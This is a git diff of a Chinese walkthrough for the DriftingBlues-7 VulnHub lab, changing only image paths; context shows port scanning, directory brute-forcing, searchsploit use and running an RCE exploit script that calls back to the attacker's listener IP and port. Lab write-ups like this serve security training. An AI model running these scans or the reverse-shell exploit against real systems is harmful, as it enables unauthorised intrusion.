@@ -10,13 +10,13 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\1.jpg)
+![](./pic-7/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\2.jpg)
+![](./pic-7/2.jpg)
 
 - SSH服务，在22端口
 - HTTP服务有四个
@@ -33,15 +33,15 @@ Taskmaster 是一个用于管理 Windows 任务计划的 Go 语言库。它允�
 
 访问66端口，发现是一个HTML页面，并且点击页面功能，都只是在当前页面，也就是这里就是一个HTML页面，无其他东西
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\3.jpg)
+![](./pic-7/3.jpg)
 
 访问80端口，发现会直接跳转至443端口，且是一个登录界面
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\4.jpg)
+![](./pic-7/4.jpg)
 
 访问8086端口，提示未找到界面，不过这里可能是自定义的`404`界面
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\5.jpg)
+![](./pic-7/5.jpg)
 
 ## 网站目录爆破
 
@@ -53,7 +53,7 @@ Taskmaster 是一个用于管理 Windows 任务计划的 Go 语言库。它允�
 gobuster dir -u http://192.168.1.65:66 -w /usr/share/wordlists/dirb/big.txt -x zip,php,txt,md,html,jpg -d -b 404,403
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\6.jpg)
+![](./pic-7/6.jpg)
 
 爆破80端口，也就是默认的
 
@@ -61,7 +61,7 @@ gobuster dir -u http://192.168.1.65:66 -w /usr/share/wordlists/dirb/big.txt -x z
 dirsearch -u http://192.168.1.65 -e .zip -x 403,404 -t 200
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\6-1.jpg)
+![](./pic-7/6-1.jpg)
 
 爆破8086端口
 
@@ -69,7 +69,7 @@ dirsearch -u http://192.168.1.65 -e .zip -x 403,404 -t 200
 gobuster dir -u http://192.168.1.65:8086 -w /usr/share/wordlists/dirb/big.txt -x zip,php,txt,md,html,jpg -d -b 404,403
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\6-2.jpg)
+![](./pic-7/6-2.jpg)
 
 爆破443端口，也就是`https`服务
 
@@ -78,13 +78,13 @@ dirsearch -u https://192.168.1.65 -x 403,404 -t 200 --exclude-sizes=196B
 #这里的--exclude-sizes=196B 是因为在默认界面就是这个字节，并且没加该参数前，大部分都是跳转到这个默认界面，没有参考价值
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\6-4.jpg)
+![](./pic-7/6-4.jpg)
 
 ## 网站指纹识别
 
 使用`whatweb`进行测试`80、443、66、8086`端口
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\6-3.jpg)
+![](./pic-7/6-3.jpg)
 
 # 漏洞寻找
 
@@ -92,11 +92,11 @@ dirsearch -u https://192.168.1.65 -x 403,404 -t 200 --exclude-sizes=196B
 
 访问并下载`.bash_history`，查看其中的内容
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\7.jpg)
+![](./pic-7/7.jpg)
 
 当前目录下，有`flag.txt`，查看，说是`flag 1/1`，结束了?
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\8.jpg)
+![](./pic-7/8.jpg)
 
 ## 访问443端口目录
 
@@ -108,28 +108,28 @@ dirsearch -u https://192.168.1.65 -x 403,404 -t 200 --exclude-sizes=196B
 
 访问`README.md`，发现一个接口版本
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\9.jpg)
+![](./pic-7/9.jpg)
 
 使用`searchsploit`查看有无该版本对应的历史漏洞
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\10.jpg)
+![](./pic-7/10.jpg)
 
 使用远程代码执行的RCE，使用`locate`定位文件位置，然后复制到当前目录，进行相关操作
 
 这里该文件其实是`python`脚本，可以自己查看，里面也有用法
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\11.jpg)
+![](./pic-7/11.jpg)
 
 ```shell
 python3 exp.py https://192.168.1.65 -ip 192.168.1.16 -port 1234
 #这里的-ip是指kali的地址，也就是监听地址，-port是kali监听端口
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\12.jpg)
+![](./pic-7/12.jpg)
 
 查看文件
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-7\13.jpg)
+![](./pic-7/13.jpg)
 
 
 
